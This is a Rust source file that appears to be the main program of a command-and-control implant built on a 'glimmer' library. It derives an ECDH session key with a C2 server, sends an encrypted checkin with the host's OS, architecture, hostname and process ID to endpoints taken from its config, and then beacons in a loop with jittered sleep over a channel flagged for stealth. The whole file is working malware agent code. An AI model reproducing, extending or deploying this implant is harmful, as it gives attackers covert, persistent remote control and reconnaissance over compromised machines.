use glimmer::c2::{Channel, SendContext};
use glimmer::c2::http::HTTPChannel;
use glimmer::cfg::Config;
use glimmer::crypto::EphemeralKeypair;
use glimmer::identity;
use glimmer::proto::{CheckinData, Envelope, MsgType};

fn main() {
    let config = match Config::load("config.json") {
        Ok(c) => c,
        Err(e) => {
            eprintln!("config: {}", e);
            std::process::exit(1);
        }
    };

    let node_id = identity::generate();

    let server_pub = match config.server_public_key_bytes() {
        Ok(k) => k,
        Err(e) => {
            eprintln!("invalid server public key: {}", e);
            std::process::exit(1);
        }
    };

    let keypair = EphemeralKeypair::generate();
    let pub_key_bytes = keypair.public_key_bytes();

    let session_key = match keypair.derive_session_key(&server_pub) {
        Ok(k) => k,
        Err(e) => {
            eprintln!("ECDH derivation failed: {}", e);
            std::process::exit(1);
        }
    };

    eprintln!("[dev] session key derived");

    let channel = match HTTPChannel::new(config.c2_endpoints.clone()) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("channel init failed: {}", e);
            std::process::exit(1);
        }
    };

    eprintln!(
        "[dev] channel: {} (stealth={}, max={})",
        channel.info().name,
        channel.info().stealth,
        channel.info().max_payload
    );

    // Checkin — prepend raw public key to encrypted payload
    let checkin = CheckinData {
        os: std::env::consts::OS.into(),
        arch: std::env::consts::ARCH.into(),
        host: hostname(),
        pid: std::process::id(),
        pub_key: pub_key_bytes.clone(),
    };

    match send_checkin(
        &node_id,
        &checkin,
        &pub_key_bytes,
        &session_key,
        &server_pub,
        &channel,
    ) {
        Ok(_) => eprintln!("[dev] checkin sent"),
        Err(e) => eprintln!("[dev] checkin failed: {}", e),
    }

    // Beacon loop
    loop {
        match send_beacon(&node_id, &session_key, &server_pub, &channel) {
            Ok(_) => eprintln!("[dev] beacon sent"),
            Err(e) => eprintln!("[dev] beacon failed: {}", e),
        }

        sleep(config.beacon_interval(), config.jitter_percent);
    }
}

fn send_checkin(
    node_id: &str,
    checkin: &CheckinData,
    pub_key: &[u8],
    key: &glimmer::crypto::SessionKey,
    server_pub: &[u8],
    channel: &dyn Channel,
) -> Result<Option<Vec<u8>>, Box<dyn std::error::Error>> {
    let envelope = Envelope::with_data(MsgType::Checkin, node_id, checkin)?;
    let serialized = envelope.marshal()?;
    let encrypted = key.encrypt(&serialized)?;

    // Prepend beacon public key for ECDH
    let mut payload = Vec::with_capacity(pub_key.len() + encrypted.len());
    payload.extend_from_slice(pub_key);
    payload.extend_from_slice(&encrypted);

    let ctx = SendContext::new(server_pub, &node_id, payload);
    channel.send(&ctx)
}

fn send_beacon(
    node_id: &str,
    key: &glimmer::crypto::SessionKey,
    server_pub: &[u8],
    channel: &dyn Channel,
) -> Result<Option<Vec<u8>>, Box<dyn std::error::Error>> {
    let envelope = Envelope::new(MsgType::Beacon, node_id, None);
    let serialized = envelope.marshal()?;
    let encrypted = key.encrypt(&serialized)?;

    let ctx = SendContext::new(server_pub, &node_id,encrypted);
    channel.send(&ctx)
}

fn sleep(base: std::time::Duration, jitter: f64) {
    let random: f64 = rand::random();
    let j = base.mul_f64(jitter * random);
    std::thread::sleep(base + j);
}

fn hostname() -> String {
    std::fs::read_to_string("/etc/hostname")
        .unwrap_or_else(|_| "unknown".into())
        .trim()
        .to_string()
}